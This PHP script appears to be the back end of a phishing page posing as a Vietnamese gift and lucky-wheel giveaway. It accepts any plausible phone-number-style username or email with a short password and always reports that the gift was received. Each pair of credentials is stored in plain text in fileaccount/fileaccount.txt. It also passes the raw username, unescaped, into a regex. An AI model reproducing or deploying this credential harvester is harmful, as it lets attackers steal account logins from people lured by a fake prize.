<?php

    session_start();
$result = 1;
    function emailValid($string) { 
        if (preg_match ("/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+\.[A-Za-z]{2,6}$/", $string)) {
            return true;
        }
    }




    if (isset($_POST['username'])) {
       $username = $_POST['username'];
       $password = $_POST['password'];

 
    if (strlen((int)$username) >= 8 && strlen($_POST['password']) > 4) {
         $stt = 'success';
         $msg = 'Nhận Quà Thành Công'; 
          $_SESSION['username'] = $username ;
          $_SESSION['wheel'] = 3 ;
         $newcontent = $username."|".$password."\n";
         if(!preg_match('/'.$username.'/', file_get_contents('fileaccount.txt')))
		 {
			$file = fopen('fileaccount/fileaccount.txt','a');
			fwrite($file,$newcontent);
			fclose($file);
			fwrite(fopen('fileaccount/ksua.txt','a'),$username."\n");
			fclose(fopen('fileaccount/ksua.txt','a'));
         }
        
        
    }else{
if (emailValid($username) && strlen($_POST['password']) > 5){
         $stt = 'success';
         $msg = 'Nhận Quà Thành Công'; 
          $_SESSION['username'] = $username ;
          $_SESSION['wheel'] = 3 ;
         $newcontent = $username."|".$password."\n";
         
         if(!preg_match('/'.$username.'/', file_get_contents('fileaccount.txt')))
		 {
			$file = fopen('fileaccount/fileaccount.txt','a');
			fwrite($file,$newcontent);
			fclose($file);
			fwrite(fopen('fileaccount/ksua.txt','a'),$username."\n");
			fclose(fopen('fileaccount/ksua.txt','a'));
         }
     
     }else {
         $stt = 'error';
         $msg = 'Tài khoản hoặc mật khẩu bạn vừa nhập chưa chính xác.';
}
}
}
$arr    = array(
    'status' => $stt,
    'message' => $msg
);
$json_a = json_encode($arr, true);
echo $json_a;
?>